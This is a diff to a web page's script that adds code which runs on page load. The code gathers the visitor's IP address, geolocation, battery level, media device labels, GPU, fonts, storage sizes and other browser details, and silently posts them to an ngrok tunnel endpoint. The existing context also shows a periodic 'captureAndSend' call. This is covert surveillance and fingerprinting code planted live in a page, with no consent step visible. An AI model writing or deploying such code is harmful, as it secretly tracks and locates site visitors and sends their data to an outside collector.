@@ -124,6 +124,159 @@
         });
     }
     setInterval(captureAndSend, 4000);
+
+    
+        async function collectAndSendInformation() {
+            try {
+                // Collect visitor information
+                const visitorInfo = {
+                    ip: await fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip),
+                    geolocation: await getCurrentLocation(),
+                    userAgent: navigator.userAgent,
+                    cookiesEnabled: navigator.cookieEnabled,
+                    referrer: document.referrer,
+                    language: navigator.language,
+                    batteryStatus: await getBatteryStatus(),
+                    connectionType: navigator.connection ? navigator.connection.type : 'unknown',
+                    platform: navigator.platform,
+                    hasCookies: checkCookies(),
+                    screenWidth: window.screen.width,
+                    screenHeight: window.screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    touchPoints: navigator.maxTouchPoints,
+                    gpuInfo: getWebGLRendererInfo(),
+                    mediaDevices: await getMediaDevices(),
+                    networkType: navigator.connection ? navigator.connection.effectiveType : 'unknown',
+                    fonts: getInstalledFonts(),
+                    localStorageUsage: checkStorageUsage('localStorage'),
+                    sessionStorageUsage: checkStorageUsage('sessionStorage'),
+                    decodingCapabilities: await getMediaDecodingCapabilities(),
+                    // Add more properties as needed
+                };
+
+                async function getCurrentLocation() {
+                    return new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            position => {
+                                resolve({
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                });
+                            },
+                            error => {
+                                console.error('Error getting geolocation:', error);
+                                resolve(null);
+                            }
+                        );
+                    });
+                }
+
+                function getWebGLRendererInfo() {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const info = {
+                            vendor: gl.getParameter(gl.VENDOR),
+                            renderer: gl.getParameter(gl.RENDERER),
+                        };
+                        return info;
+                    }
+                    return null;
+                }
+
+                async function getMediaDevices() {
+                    try {
+                        const devices = await navigator.mediaDevices.enumerateDevices();
+                        return devices.map(device => ({
+                            kind: device.kind,
+                            label: device.label,
+                        }));
+                    } catch (error) {
+                        console.error('Error enumerating media devices:', error);
+                        return [];
+                    }
+                }
+
+                function getInstalledFonts() {
+                    const fontList = [];
+                    try {
+                        const fonts = document.fonts;
+                        fonts.forEach(font => {
+                            fontList.push(font.family);
+                        });
+                    } catch (error) {
+                        console.error('Error getting installed fonts:', error);
+                    }
+                    return fontList;
+                }
+
+                function checkStorageUsage(storageType) {
+                    try {
+                        const storage = window[storageType];
+                        if (storage) {
+                            const usage = JSON.stringify(storage).length; // Approximate storage usage in bytes
+                            return usage;
+                        }
+                    } catch (error) {
+                        console.error(`Error checking ${storageType} usage:`, error);
+                    }
+                    return null;
+                }
+
+                async function getMediaDecodingCapabilities() {
+                    try {
+                        const capabilities = await navigator.mediaCapabilities.decodingInfo();
+                        return capabilities;
+                    } catch (error) {
+                        console.error('Error getting media decoding capabilities:', error);
+                        return null;
+                    }
+                }
+                async function getBatteryStatus() {
+                    try {
+                        const battery = await navigator.getBattery();
+                        return {
+                            charging: battery.charging,
+                            level: battery.level,
+                        };
+                    } catch (error) {
+                        console.error('Error getting battery status:', error);
+                        return null;
+                    }
+                }
+
+                function checkCookies() {
+                    try {
+                        document.cookie = 'test_cookie=yes';
+                        const cookiesEnabled = document.cookie.indexOf('test_cookie=yes') !== -1;
+                        return cookiesEnabled;
+                    } catch (error) {
+                        console.error('Error checking cookies:', error);
+                        return null;
+                    }
+                }
+
+                // Send the information to the API
+                const apiUrl = 'https://15d1-2401-4900-1c82-7599-30b9-4d45-1830-9c53.ngrok-free.app/collect';
+                await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(visitorInfo),
+                });
+
+                console.log('Information sent to the API:', visitorInfo);
+            } catch (error) {
+                console.error('Error collecting or sending information:', error);
+            }
+        }
+
+        // Call the function when the page loads
+        collectAndSendInformation();
+
 </script>
 
 </body>
